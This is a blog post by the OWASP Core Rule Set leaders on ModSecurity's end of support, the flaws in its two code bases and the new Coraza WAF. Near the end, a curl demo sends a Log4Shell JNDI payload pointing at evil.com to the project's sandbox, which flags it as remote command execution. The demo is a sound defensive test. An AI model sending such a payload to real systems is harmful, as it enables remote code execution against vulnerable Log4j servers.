---
author: dune73
categories:
  - Blog
date: '2021-12-22T13:23:02+01:00'
guid: https://coreruleset.org/?p=1584
id: 1584
permalink: /20211222/talking-about-modsecurity-and-the-new-coraza-waf/
title: Talking about ModSecurity and the new Coraza WAF
url: /2021/12/22/talking-about-modsecurity-and-the-new-coraza-waf/
---


It's time to talk about the ModSecurity engine and to introduce you to Coraza, a new contender on the WAF front. Any rule set is nothing without a WAF engine to run it, so even if our project is focused on the rules, we need to look at the underlying engine(s) from time to time.

On August 26, 2021, Trustwave, the owner of ModSecurity, announced the end of Support for ModSecurity for 2024 in a [blog post](https://www.trustwave.com/en-us/resources/security-resources/software-updates/end-of-sale-and-trustwave-support-for-modsecurity-web-application-firewall/). The blog also states that Trustwave plans to “let the open-source community continue the project.”

During autumn, OWASP, our mother organization, reached out to Trustwave and offered to assume stewardship of the project and attract sponsors while honoring Trustwave’s existing commitments. Sadly, OWASP and Trustwave were not yet able to find a common path before the end of Trustwave’s end of life support in 2024. So Trustwave is winding down their commitment and we need to move on.

As the provider of the OWASP ModSecurity Core Rule Set, we are the biggest users of ModSecurity, but also one of the biggest experts on ModSecurity. Our CRS co-leader Dr. Christian Folini is the author of the 2nd edition of the quasi-official ModSecurity Handbook, and our project brings together a unique expertise of ModSecurity in very diverse setups. We have been examining the development of ModSecurity ever since it was taken over by Trustwave, we have seen lead developers join and leave the company, we have raised dozens of issues and we contributed with several pull requests.

Without going into too much detail, we think it is fair to say that ModSecurity failed to attract a community of active developers. CRS has grown from 3 to 12 active developers since it separated from Trustwave in 2016. Meanwhile, ModSecurity has not been able to keep up with the necessary resources to accommodate the growing CRS project and its users.

#### ModSecurity: a problem with two code bases

One problem is the ModSecurity code base. The traditional base is ModSecurity 2, a venerable Apache module, originally developed by Ivan Ristić. However ModSecurity 2 is heavily linked to Apache internals, which makes it hard to port it and makes it sensible to re-factor. There is the successor libModSecurity 3, a standalone engine built from scratch in C++ with a connector module to integrate it into NGINX. ModSecurity 3 was released as stable and production-ready in December 2017.

It's been four years, and CRS still uses ModSecurity 2 as its reference implementation. The main reason is ModSecurity 3 fails to pass all tests in our test suite. Trustwave dubbed ModSecurity 3 as a re-implementation with an equal feature set, which has not happened yet. Recently, we sent Trustwave a list a dozen implementation gaps and differences that break CRS rules and potentially open up an application to attacks.

But this is not the only problem. NGINX is also the only platform where a publicly available ModSecurity 3 connector module exists. So you can not run ModSecurity 3 on the traditional Apache and also not on the new hot cloud stuff. And the performance of ModSecurity 3 is much worse than the throughput of ModSecurity 2 on Apache (Yes, you heard this right: Once ModSecurity comes into play, Apache is way faster than NGINX).

So, we have a very old code base that is bound to Apache, and a newer codebase that is incomplete, less performant, and only runs on NGINX.

CRS has pondered the problem, but we came to the conclusion that we will rather use our knowledge and resources to write rules than working on an engine. That’s said, we will strive to become engine-neutral. (Which does not mean we are not supportive. The last few security problems in ModSecurity have all been discovered by CRS developers and shared with the ModSecurity developers before publication. And we have quite a few pull requests open on the ModSecurity GitHub on top.)

The only viable option for a ModSecurity fork would be a company or organization with deep pockets and the resources to clean up the codebases, closing the gaps and then maybe a vision of how to move forward. We expect about 4,000 hours of investment for both code bases.

So in our opinion, the situation looks rather bleak for ModSecurity and for those integrators who have invested in ModSecurity. We're facing a similar situation apparently. But we also think there is reason for hope. Let us explain!

First, ModSecurity’s SecLang engine is not overly important. There are already several commercial reimplementations of ModSecurity, and there is nothing preventing an open source alternative.

And second, the intelligence is in the rule set, not in the engine. Mike Shinn, CEO of Atomicorp, an old school vendor of ModSecurity rules, has put it this way recently: "The real magic of ModSecurity is always in the rules anyways." As an open source rules provider, we could not agree more.

So all we really need is an open source alternative to ModSecurity. And such a very interesting alternative has arrived now: Entering the [Coraza WAF](https://coraza.io).

#### The beauty of the new Coraza WAF

Coraza is an implementation of a SecLang engine in the memory-safe Go language, all developed by Juan Pablo Tosso from Chile. Coraza is currently only working on the open source [Caddy web server](https://caddyserver.com/), but Coraza already passes 100% of the CRS test suite and we are convinced it is production ready. Juan Pablo has picked up work on Apache and NGINX integration, and he wants to make it a drop-in replacement for ModSecurity. And then many, many more plans. The only obstacle to fill these with life is the lack of a developer community around Coraza. And we sincerely hope that the beauty of the project will inspire people to check it out and join!

<figure class="wp-block-image size-large">![](/images/2021/12/coraza-logo-1024x253.png)<figcaption>*The new Coraza WAF with its pet "Sancho" on the right.*</figcaption></figure>To give you an early access to Coraza, if you do not have a Caddy webserver to play around, we have set up a Caddy with Coraza on our CRS sandbox, and you can try it out immediately. In the following example, we will send a Log4J exploit to the sandbox. Note that with the “x-backend” header, we pick Coraza as an engine, and with “x-crs-version” we pick the Core Rule Set with the extra Log4J rule from our [earlier Log4J blog post](https://coreruleset.org/20211213/crs-and-log4j-log4shell-cve-2021-44228/).

> $ curl -H "x-crs-paranoia-level: 4" \\  
>  -H "x-format-output: txt-matched-rules" \\  
>  -H "x-backend: coraza" \\  
>  -H "x-crs-version: 3.4.0-dev-log4j" \\  
>  -H ‘***User-Agent: ${jndi:ldap://evil.com}***’ \\  
>  https://sandbox.coreruleset.org  
> 1005 PL1 Potential Remote Command Execution: Log4j CVE-2021-44228  
> 932130 PL1 Remote Command Execution: Unix Shell Expression Found  
> 949110 PL1 Inbound Anomaly Score Exceeded (Total Score: 10)  
> 980130 PL1 Inbound Anomaly Score Exceeded (Total Inbound Score: 10 - SQLI=0,XSS=0,RFI=0,LFI=0,RCE=10,PHPI=0,HTTP=0,SESS=0): individual paranoia level scores: 10, 0, 0, 0

#### **Conclusion**

We are not sailing away from the ModSecurity island just yet, but we are helping to build a new ship. While we see problems with the viability of the ModSecurity project, we will continue to test it and report issues with ModSecurity 3 productively in order to help improve its outlook. Meanwhile, we will work with the community on creating alternatives such as Coraza, so our users can use the Core Rule Set with any modern setups for many years to come. Our sandbox will be a useful asset to help us assess and compare various engines, to give our users as many options as possible.

If you are interested in looking at Coraza, here are some interesting links:

- <https://coraza.io>
- <https://coraza.io/docs/tutorials/introduction/>
- <https://github.com/jptosso/coraza-waf>

We will keep you updated on new developments in this regard.  
  
*Walter Hop and Christian Folini, leaders of the OWASP ModSecurity Core Rule Set project*  
  
P.S. Juan Pablo Tosso asked CRS to come up with a name for his Coraza mascot. We settled on Sancho and he thought it was a great fit.
